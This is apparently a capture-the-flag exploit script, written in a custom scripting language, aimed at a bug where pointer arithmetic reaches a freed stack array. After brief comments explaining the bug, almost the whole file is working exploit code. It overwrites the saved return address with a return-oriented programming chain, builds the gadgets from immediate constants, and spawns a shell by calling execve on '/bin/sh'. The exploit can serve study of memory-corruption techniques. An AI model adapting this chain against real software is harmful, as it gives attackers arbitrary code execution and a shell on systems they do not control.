# Bug: we can perform add/sub operation on pointer to array,
# so we can let a pointer to point to anywhere on stack.
# Exploit: create an array on stack, and exit the function,
# but array is still on stack, including the random type magic number.
# Therefore, in another function, we can make a pointer to this released array.
# However, at this time the elements of this released array
# overlap with some critical data, such as saved rip and other local variables.
# Thus, we can leak addresses and write a rop chain using this primitive.
# ROP gadgets are made by using immediate numbers.
def create_arr_on_stk():
	arr = array(0x20)
	arr[0] = 0x20192019

def exp():
	arr = array(1)
	arr[0] = (0x68732f * 0x10000 * 0x10000) + 0x6e69622f
	x = arr - 5 * 8
	x[11] = x[9] + 8
	x[12] = x[10] + 0x41 # pop rsi
	x[13] = 0
	x[14] = x[10] + 0x49 # pop rdx
	x[15] = 0
	x[16] = x[10] + 0x29 # pop rax
	x[17] = 59
	x[18] = x[10] + 0x21 # syscall
	x[10] = x[10] + 0x31 # pop rdi

def exp_wrap():
	arr = array(0x14)
	exp()

def main():
	b = 0x50f # syscall
	a = 0xc358 # pop rax
	c = 0xc35f # pop rdi
	d = 0xc359
	e = 0xc35e # pop rsi
	f = 0xc35a # pop rdx
	create_arr_on_stk()
	exp_wrap()